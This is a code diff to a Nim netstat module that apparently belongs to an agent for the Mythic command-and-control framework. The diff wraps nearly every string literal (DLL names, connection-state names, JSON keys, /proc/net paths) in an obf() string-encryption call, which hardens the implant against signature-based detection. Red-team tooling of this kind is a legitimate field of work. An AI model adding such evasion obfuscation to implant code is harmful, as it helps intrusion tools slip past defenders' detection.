@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat, strutils, osproc, os]
 
 when defined(windows):
@@ -71,11 +72,11 @@ when defined(windows):
   
   proc GetExtendedTcpTable(pTcpTable: pointer, pdwSize: ptr DWORD, bOrder: WINBOOL,
                           ulAf: ULONG, TableClass: DWORD, Reserved: ULONG): DWORD
-    {.importc, dynlib: "iphlpapi.dll", stdcall.}
+    {.importc, dynlib: obf("iphlpapi.dll"), stdcall.}
   
   proc GetExtendedUdpTable(pUdpTable: pointer, pdwSize: ptr DWORD, bOrder: WINBOOL,
                           ulAf: ULONG, TableClass: DWORD, Reserved: ULONG): DWORD
-    {.importc, dynlib: "iphlpapi.dll", stdcall.}
+    {.importc, dynlib: obf("iphlpapi.dll"), stdcall.}
   
   proc ntohl(netlong: uint32): uint32 =
     ((netlong and 0xFF000000'u32) shr 24) or
@@ -89,18 +90,18 @@ when defined(windows):
   
   proc stateToString(state: DWORD): string =
     case state
-    of 1: "CLOSED"
-    of 2: "LISTEN"
-    of 3: "SYN_SENT"
-    of 4: "SYN_RCVD"
-    of 5: "ESTABLISHED"
-    of 6: "FIN_WAIT1"
-    of 7: "FIN_WAIT2"
-    of 8: "CLOSE_WAIT"
-    of 9: "CLOSING"
-    of 10: "LAST_ACK"
-    of 11: "TIME_WAIT"
-    of 12: "DELETE_TCB"
+    of 1: obf("CLOSED")
+    of 2: obf("LISTEN")
+    of 3: obf("SYN_SENT")
+    of 4: obf("SYN_RCVD")
+    of 5: obf("ESTABLISHED")
+    of 6: obf("FIN_WAIT1")
+    of 7: obf("FIN_WAIT2")
+    of 8: obf("CLOSE_WAIT")
+    of 9: obf("CLOSING")
+    of 10: obf("LAST_ACK")
+    of 11: obf("TIME_WAIT")
+    of 12: obf("DELETE_TCB")
     else: "UNKNOWN"
   
   proc ipv4ToString(ipAddr: DWORD): string =
@@ -118,14 +119,14 @@ when defined(windows):
       parts.add(&"{word:x}")
     return parts.join(":")
 
-when defined(posix):
+when defined(linux):
   import std/osproc
 
 proc parseHexIP(hex: string): string =
   ## Parse hex IP address (little-endian) from /proc/net to dotted decimal
   ## Example: 0100007F -> 127.0.0.1
   if hex.len != 8:
-    return "0.0.0.0"
+    return obf("0.0.0.0")
   try:
     let a = parseHexInt(hex[6..7])
     let b = parseHexInt(hex[4..5])
@@ -133,7 +134,7 @@ proc parseHexIP(hex: string): string =
     let d = parseHexInt(hex[0..1])
     return &"{a}.{b}.{c}.{d}"
   except:
-    return "0.0.0.0"
+    return obf("0.0.0.0")
 
 proc parseHexIPv6(hex: string): string =
   ## Parse hex IPv6 address from /proc/net to standard format
@@ -156,17 +157,17 @@ proc parseTcpState(stateHex: string): string =
   try:
     let state = parseHexInt(stateHex)
     case state
-    of 0x01: return "ESTABLISHED"
-    of 0x02: return "SYN_SENT"
-    of 0x03: return "SYN_RECV"
-    of 0x04: return "FIN_WAIT1"
-    of 0x05: return "FIN_WAIT2"
-    of 0x06: return "TIME_WAIT"
-    of 0x07: return "CLOSE"
-    of 0x08: return "CLOSE_WAIT"
-    of 0x09: return "LAST_ACK"
-    of 0x0A: return "LISTEN"
-    of 0x0B: return "CLOSING"
+    of 0x01: return obf("ESTABLISHED")
+    of 0x02: return obf("SYN_SENT")
+    of 0x03: return obf("SYN_RECV")
+    of 0x04: return obf("FIN_WAIT1")
+    of 0x05: return obf("FIN_WAIT2")
+    of 0x06: return obf("TIME_WAIT")
+    of 0x07: return obf("CLOSE")
+    of 0x08: return obf("CLOSE_WAIT")
+    of 0x09: return obf("LAST_ACK")
+    of 0x0A: return obf("LISTEN")
+    of 0x0B: return obf("CLOSING")
     else: return "UNKNOWN"
   except:
     return "UNKNOWN"
@@ -194,13 +195,13 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
           for i in 0..<tcpTable.dwNumEntries:
             let row = tcpRows[i]
             var conn = %*{
-              "proto": "TCP",
-              "local_addr": ipv4ToString(row.dwLocalAddr),
-              "local_port": ntohs(uint16(row.dwLocalPort)),
-              "remote_addr": ipv4ToString(row.dwRemoteAddr),
-              "remote_port": ntohs(uint16(row.dwRemotePort)),
-              "associated_pids": [row.dwOwningPid],
-              "state": stateToString(row.dwState)
+              obf("proto"): obf("TCP"),
+              obf("local_addr"): ipv4ToString(row.dwLocalAddr),
+              obf("local_port"): ntohs(uint16(row.dwLocalPort)),
+              obf("remote_addr"): ipv4ToString(row.dwRemoteAddr),
+              obf("remote_port"): ntohs(uint16(row.dwRemotePort)),
+              obf("associated_pids"): [row.dwOwningPid],
+              obf("state"): stateToString(row.dwState)
             }
             connections.add(conn)
       
@@ -219,13 +220,13 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
           for i in 0..<tcp6Table.dwNumEntries:
             let row = tcp6Rows[i]
             var conn = %*{
-              "proto": "TCP6",
-              "local_addr": ipv6ToString(row.ucLocalAddr),
-              "local_port": ntohs(uint16(row.dwLocalPort)),
-              "remote_addr": ipv6ToString(row.ucRemoteAddr),
-              "remote_port": ntohs(uint16(row.dwRemotePort)),
-              "associated_pids": [row.dwOwningPid],
-              "state": stateToString(row.dwState)
+              obf("proto"): obf("TCP6"),
+              obf("local_addr"): ipv6ToString(row.ucLocalAddr),
+              obf("local_port"): ntohs(uint16(row.dwLocalPort)),
+              obf("remote_addr"): ipv6ToString(row.ucRemoteAddr),
+              obf("remote_port"): ntohs(uint16(row.dwRemotePort)),
+              obf("associated_pids"): [row.dwOwningPid],
+              obf("state"): stateToString(row.dwState)
             }
             connections.add(conn)
       
@@ -244,13 +245,13 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
           for i in 0..<udpTable.dwNumEntries:
             let row = udpRows[i]
             var conn = %*{
-              "proto": "UDP",
-              "local_addr": ipv4ToString(row.dwLocalAddr),
-              "local_port": ntohs(uint16(row.dwLocalPort)),
-              "remote_addr": nil,
-              "remote_port": nil,
-              "associated_pids": [row.dwOwningPid],
-              "state": nil
+              obf("proto"): obf("UDP"),
+              obf("local_addr"): ipv4ToString(row.dwLocalAddr),
+              obf("local_port"): ntohs(uint16(row.dwLocalPort)),
+              obf("remote_addr"): nil,
+              obf("remote_port"): nil,
+              obf("associated_pids"): [row.dwOwningPid],
+              obf("state"): nil
             }
             connections.add(conn)
       
@@ -269,22 +270,22 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
           for i in 0..<udp6Table.dwNumEntries:
             let row = udp6Rows[i]
             var conn = %*{
-              "proto": "UDP6",
-              "local_addr": ipv6ToString(row.ucLocalAddr),
-              "local_port": ntohs(uint16(row.dwLocalPort)),
-              "remote_addr": nil,
-              "remote_port": nil,
-              "associated_pids": [row.dwOwningPid],
-              "state": nil
+              obf("proto"): obf("UDP6"),
+              obf("local_addr"): ipv6ToString(row.ucLocalAddr),
+              obf("local_port"): ntohs(uint16(row.dwLocalPort)),
+              obf("remote_addr"): nil,
+              obf("remote_port"): nil,
+              obf("associated_pids"): [row.dwOwningPid],
+              obf("state"): nil
             }
             connections.add(conn)
     
-    when defined(posix):
+    when defined(linux):
       # Read directly from /proc/net/tcp and /proc/net/udp like oopsie does
       try:
         # Parse /proc/net/tcp
-        if fileExists("/proc/net/tcp"):
-          let tcpData = readFile("/proc/net/tcp")
+        if fileExists(obf("/proc/net/tcp")):
+          let tcpData = readFile(obf("/proc/net/tcp"))
           for line in tcpData.splitLines()[1..^1]:  # Skip header
             let parts = line.strip().split()
             if parts.len >= 10:
@@ -300,22 +301,22 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     let localPort = parseHexInt(localParts[1])
                     
                     var conn = %*{
-                      "proto": "TCP",
-                      "local_addr": localIp,
-                      "local_port": localPort,
-                      "remote_addr": nil,
-                      "remote_port": nil,
-                      "associated_pids": newJArray(),
-                      "state": parseTcpState(parts[3])
+                      obf("proto"): obf("TCP"),
+                      obf("local_addr"): localIp,
+                      obf("local_port"): localPort,
+                      obf("remote_addr"): nil,
+                      obf("remote_port"): nil,
+                      obf("associated_pids"): newJArray(),
+                      obf("state"): parseTcpState(parts[3])
                     }
                     
                     # Parse remote address
                     if ':' in parts[2]:
                       let remoteParts = parts[2].split(':')
-                      if remoteParts.len == 2 and remoteParts[0] != "00000000":
+                      if remoteParts.len == 2 and remoteParts[0] != obf("00000000"):
                         try:
-                          conn["remote_addr"] = %parseHexIP(remoteParts[0])
-                          conn["remote_port"] = %parseHexInt(remoteParts[1])
+                          conn[obf("remote_addr")] = %parseHexIP(remoteParts[0])
+                          conn[obf("remote_port")] = %parseHexInt(remoteParts[1])
                         except:
                           discard
                     
@@ -324,8 +325,8 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     discard
         
         # Parse /proc/net/tcp6
-        if fileExists("/proc/net/tcp6"):
-          let tcp6Data = readFile("/proc/net/tcp6")
+        if fileExists(obf("/proc/net/tcp6")):
+          let tcp6Data = readFile(obf("/proc/net/tcp6"))
           for line in tcp6Data.splitLines()[1..^1]:  # Skip header
             let parts = line.strip().split()
             if parts.len >= 10:
@@ -337,21 +338,21 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     let localPort = parseHexInt(localParts[1])
                     
                     var conn = %*{
-                      "proto": "TCP",
-                      "local_addr": localIp,
-                      "local_port": localPort,
-                      "remote_addr": nil,
-                      "remote_port": nil,
-                      "associated_pids": newJArray(),
-                      "state": parseTcpState(parts[3])
+                      obf("proto"): obf("TCP"),
+                      obf("local_addr"): localIp,
+                      obf("local_port"): localPort,
+                      obf("remote_addr"): nil,
+                      obf("remote_port"): nil,
+                      obf("associated_pids"): newJArray(),
+                      obf("state"): parseTcpState(parts[3])
                     }
                     
                     if ':' in parts[2]:
                       let remoteParts = parts[2].split(':')
-                      if remoteParts.len == 2 and remoteParts[0] != "00000000000000000000000000000000":
+                      if remoteParts.len == 2 and remoteParts[0] != obf("00000000000000000000000000000000"):
                         try:
-                          conn["remote_addr"] = %parseHexIPv6(remoteParts[0])
-                          conn["remote_port"] = %parseHexInt(remoteParts[1])
+                          conn[obf("remote_addr")] = %parseHexIPv6(remoteParts[0])
+                          conn[obf("remote_port")] = %parseHexInt(remoteParts[1])
                         except:
                           discard
                     
@@ -360,8 +361,8 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     discard
         
         # Parse /proc/net/udp
-        if fileExists("/proc/net/udp"):
-          let udpData = readFile("/proc/net/udp")
+        if fileExists(obf("/proc/net/udp")):
+          let udpData = readFile(obf("/proc/net/udp"))
           for line in udpData.splitLines()[1..^1]:  # Skip header
             let parts = line.strip().split()
             if parts.len >= 10:
@@ -373,13 +374,13 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     let localPort = parseHexInt(localParts[1])
                     
                     var conn = %*{
-                      "proto": "UDP",
-                      "local_addr": localIp,
-                      "local_port": localPort,
-                      "remote_addr": nil,
-                      "remote_port": nil,
-                      "associated_pids": newJArray(),
-                      "state": nil
+                      obf("proto"): obf("UDP"),
+                      obf("local_addr"): localIp,
+                      obf("local_port"): localPort,
+                      obf("remote_addr"): nil,
+                      obf("remote_port"): nil,
+                      obf("associated_pids"): newJArray(),
+                      obf("state"): nil
                     }
                     
                     connections.add(conn)
@@ -387,8 +388,8 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     discard
         
         # Parse /proc/net/udp6
-        if fileExists("/proc/net/udp6"):
-          let udp6Data = readFile("/proc/net/udp6")
+        if fileExists(obf("/proc/net/udp6")):
+          let udp6Data = readFile(obf("/proc/net/udp6"))
           for line in udp6Data.splitLines()[1..^1]:  # Skip header
             let parts = line.strip().split()
             if parts.len >= 10:
@@ -400,13 +401,13 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
                     let localPort = parseHexInt(localParts[1])
                     
                     var conn = %*{
-                      "proto": "UDP",
-                      "local_addr": localIp,
-                      "local_port": localPort,
-                      "remote_addr": nil,
-                      "remote_port": nil,
-                      "associated_pids": newJArray(),
-                      "state": nil
+                      obf("proto"): obf("UDP"),
+                      obf("local_addr"): localIp,
+                      obf("local_port"): localPort,
+                      obf("remote_addr"): nil,
+                      obf("remote_port"): nil,
+                      obf("associated_pids"): newJArray(),
+                      obf("state"): nil
                     }
                     
                     connections.add(conn)
@@ -421,4 +422,4 @@ proc netstat*(taskId: string, params: JsonNode): JsonNode =
     return mythicSuccess(taskId, output)
     
   except Exception as e:
-    return mythicError(taskId, &"Netstat error: {e.msg}")
+    return mythicError(taskId, obf("Netstat error: ") & e.msg)
